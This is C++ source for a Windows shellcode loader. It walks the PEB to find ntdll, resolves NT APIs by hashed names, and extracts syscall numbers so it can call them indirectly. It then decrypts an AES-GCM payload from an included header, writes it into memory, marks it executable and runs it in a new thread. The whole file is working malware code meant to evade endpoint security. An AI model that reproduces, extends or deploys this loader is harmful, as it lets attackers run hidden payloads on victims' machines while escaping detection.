#include <Windows.h>
#include <cstdio>
#include <winternl.h>
#include <winnt.h>
#include "payload_enc.h"
#include <bcrypt.h>
#include <vector>
#include <stdexcept>
#pragma comment(lib, "bcrypt.lib")


#define SEED 5

constexpr auto g_KEY = 0x69;

constexpr DWORD HashStringDjb2W(const wchar_t* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEED) + Hash) + c;
	}
	return Hash;
}

constexpr DWORD HashStringDjb2A(const char* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEED) + Hash) + c;
	}
	return Hash;
}

#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)

#define STRINGIFY2(x) #x
#define STRINGIFY(x) STRINGIFY2(x)
#define WIDEN2(x) L##x
#define WIDEN(x) WIDEN2(x)

#define CTIME_HASHA(API) \
    constexpr auto API##_Rotr32A = HashStringDjb2A(#API);

#define CTIME_HASHW(NAME, API) \
    constexpr auto NAME = HashStringDjb2W(WIDEN(STRINGIFY(API)));
/*
// Method using teb for x64
PTEB pTeb = (PTEB)__readgsqword(0x30);
PPEB pPeb = (PPEB)pTeb->ProcessEnvironmentBlock;
// for x32
PTEB pTeb = (PTEB)__readfsdword(0x18);
PPEB pPeb = (PPEB)pTeb->ProcessEnvironmentBlock;
*/
#define NtCurrentProcess() ((HANDLE)-1) // Return the pseudo handle for the current process
#define NtCurrentThread()  ((HANDLE)-2) // Return the pseudo handle for the current thread
PPEB GetPeb()
{
#ifdef _WIN64
	return (PPEB)(__readgsqword(0x60));
#else
	return (PPEB)(__readfsdword(0x30));
#endif
}

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union {
		LIST_ENTRY HashLinks;
		struct {
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union {
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	PVOID  EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} MY_LDR_DATA_TABLE_ENTRY, * PMY_LDR_DATA_TABLE_ENTRY;
// ============================================================
// Module base via PEB loader list
// ============================================================
PVOID GetModuleBase(DWORD  moduleHash)
{
	PPEB pPeb = GetPeb();
	if (!pPeb || !pPeb->Ldr)
		return NULL;

	PPEB_LDR_DATA pLdr = pPeb->Ldr;
	PLIST_ENTRY   head = &pLdr->InMemoryOrderModuleList;
	PLIST_ENTRY   curr = head->Flink;

	while (curr != head)
	{
		PMY_LDR_DATA_TABLE_ENTRY entry =
			CONTAINING_RECORD(curr, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		
		if (entry->BaseDllName.Buffer &&
			RTIME_HASHW(entry->BaseDllName.Buffer) == moduleHash)
			return entry->DllBase;

		curr = curr->Flink;
	}
	return NULL;
}

FARPROC GetPA(IN HANDLE hModule, IN DWORD  fnHash) {

	// We do this to avoid casting each time we use 'hModule'
	PBYTE pBase = (PBYTE)hModule;
	// Getting the DOS header and performing a signature check
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;
	// Getting the NT headers and performing a signature check
	PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// Getting the optional header
	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

	// Getting the image export table
	// This is the export directory
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	// Getting the function's names array pointer
	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);

	// Getting the function's addresses array pointer
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);

	// Getting the function's ordinal array pointer
	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);




	// Looping through all the exported functions
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		// Getting the name of the function
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

		// Getting the address of the function through its ordinal
		PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		// Searching for the function specified
		if (RTIME_HASHA(pFunctionName) == fnHash) {
			printf("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n",
				i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
			return (FARPROC)pFunctionAddress;
		}
	}

	return NULL;
}

extern "C" {
	DWORD    wNTAVM = 0;  UINT_PTR sysAddrNTAVM = 0;
	DWORD    wNTWVM = 0;  UINT_PTR sysAddrNTWVM = 0;
	DWORD    wNTPVM = 0;  UINT_PTR sysAddrNTPVM = 0;
	DWORD    wNTCTE = 0;  UINT_PTR sysAddrNTCTE = 0;
	NTSTATUS Sc0(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
	NTSTATUS Sc1(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
	NTSTATUS Sc2(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
	NTSTATUS Sc3(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
		PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
}
// we can declare func as this and use it in main()
//using fnAVM = decltype(&Sc0);


#define API_TABLE(X) \
    X(NtAllocateVirtualMemory, wNTAVM, sysAddrNTAVM) \
    X(NtWriteVirtualMemory,    wNTWVM, sysAddrNTWVM) \
    X(NtProtectVirtualMemory,  wNTPVM, sysAddrNTPVM) \
    X(NtCreateThreadEx,        wNTCTE, sysAddrNTCTE)

#define GEN_HASH(api, ssn, addr) CTIME_HASHA(api)
API_TABLE(GEN_HASH)

#define GEN_AND_CALL(api, ssn, addr)                       \
    do {                                                   \
        UINT_PTR _p = (UINT_PTR)GetPA(hNtdll, api##_Rotr32A); \
        if (!_p) return 1;                                 \
        ssn  = ((unsigned char*)(_p + 4))[0];              \
        addr = _p + 0x12;                                  \
    } while (0);

void CheckStatus(NTSTATUS status, const char* message)
{
	if (status < 0)
		throw std::runtime_error(message);
}

std::vector<UCHAR> DecryptAESGCM(
	const std::vector<UCHAR>& key,
	const std::vector<UCHAR>& blob)
{
	constexpr ULONG NONCE_SIZE = 12;
	constexpr ULONG TAG_SIZE = 16;

	if (key.size() != 32)
		throw std::runtime_error("AES-256 requires a 32-byte key");

	if (blob.size() < NONCE_SIZE + TAG_SIZE)
		throw std::runtime_error("Encrypted blob is too short");

	BCRYPT_ALG_HANDLE algorithm = nullptr;
	BCRYPT_KEY_HANDLE keyHandle = nullptr;

	NTSTATUS status = BCryptOpenAlgorithmProvider(
		&algorithm, BCRYPT_AES_ALGORITHM, nullptr, 0);
	CheckStatus(status, "BCryptOpenAlgorithmProvider failed");

	try {
		status = BCryptSetProperty(
			algorithm,
			BCRYPT_CHAINING_MODE,
			reinterpret_cast<PUCHAR>(
				const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)),
			sizeof(BCRYPT_CHAIN_MODE_GCM),
			0);
		CheckStatus(status, "Setting GCM mode failed");

		status = BCryptGenerateSymmetricKey(
			algorithm,
			&keyHandle,
			nullptr,
			0,
			const_cast<PUCHAR>(key.data()),
			static_cast<ULONG>(key.size()),
			0);
		CheckStatus(status, "Creating AES key failed");

		const UCHAR* nonce = blob.data();
		const UCHAR* ciphertext = blob.data() + NONCE_SIZE;
		ULONG ciphertextSize = static_cast<ULONG>(
			blob.size() - NONCE_SIZE - TAG_SIZE);
		const UCHAR* tag = blob.data() + blob.size() - TAG_SIZE;

		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
		BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
		authInfo.pbNonce = const_cast<PUCHAR>(nonce);
		authInfo.cbNonce = NONCE_SIZE;
		authInfo.pbTag = const_cast<PUCHAR>(tag);
		authInfo.cbTag = TAG_SIZE;

		std::vector<UCHAR> plaintext(ciphertextSize);
		ULONG plaintextSize = 0;

		status = BCryptDecrypt(
			keyHandle,
			const_cast<PUCHAR>(ciphertext),
			ciphertextSize,
			&authInfo,
			nullptr,
			0,
			plaintext.data(),
			static_cast<ULONG>(plaintext.size()),
			&plaintextSize,
			0);
		CheckStatus(status, "Decryption/authentication failed");

		plaintext.resize(plaintextSize);

		BCryptDestroyKey(keyHandle);
		BCryptCloseAlgorithmProvider(algorithm, 0);
		return plaintext;
	}
	catch (...) {
		if (keyHandle) BCryptDestroyKey(keyHandle);
		if (algorithm) BCryptCloseAlgorithmProvider(algorithm, 0);
		throw;
	}
}

int main() {

	// ---- Resolve ntdll base ----
	CTIME_HASHW(ntdll_Rotr32W, ntdll.dll);
	HMODULE hNtdll = (HMODULE)GetModuleBase(ntdll_Rotr32W);
	if (!hNtdll) {
		//printf("[!] GetModuleBase(ntdll) failed\n");
		return 1;
	}

	// ---- Resolve stubs and populate SSN + syscall address ----
	API_TABLE(GEN_AND_CALL);

	// ---- Call NtAllocateVirtualMemory via MASM stub ----	


	std::vector<UCHAR> blob(enc_pay, enc_pay + enc_pay_len);
	std::vector<UCHAR> key(g_Key, g_Key + 32);

	std::vector<UCHAR> plain;
	try {
		plain = DecryptAESGCM(key, blob);
	}
	catch (const std::exception& e) {
		printf("decrypt failed: %s\n", e.what());
		return 1;
	}

	printf("dwPlain=%zu\n", plain.size());
	for (size_t i = 0; i < plain.size() && i < 64; i++)
		printf("%02X ", plain[i]);
	printf("\n");

	BYTE* pPlain = plain.data();
	SIZE_T sPayload = plain.size();
	SIZE_T sAlloc = sPayload;
	PVOID  addr = nullptr;
	NTSTATUS st = Sc0(NtCurrentProcess(), &addr, 0, &sAlloc,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (st) return 1;

	// 2. Write using the ORIGINAL payload size, not sAlloc
	SIZE_T written = 0;
	NTSTATUS st2 = Sc1(NtCurrentProcess(), addr, pPlain, sPayload, &written);
	if (st2 || written != sPayload) return 1;
	

	// 3. Protect the payload region (sPayload size, not sAlloc)
	ULONG  oldProt = 0;
	SIZE_T sProt = sPayload;
	NTSTATUS st3 = Sc2(NtCurrentProcess(), &addr, &sProt,
		PAGE_EXECUTE_READ, &oldProt);
	//printf("[+] Sc2 st=0x%08X old=0x%X\n", st3, oldProt);
	if (st3) return 1;

	// 4. Execute
	HANDLE hThread = NULL;
	NTSTATUS st4 = Sc3(&hThread, 0x1FFFFF, NULL, NtCurrentProcess(),
		addr, NULL, 0, 0, 0, 0, NULL);
	//printf("[+] Sc3 st=0x%08X h=%p\n", st4, hThread);
	if (st4) return 1;

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}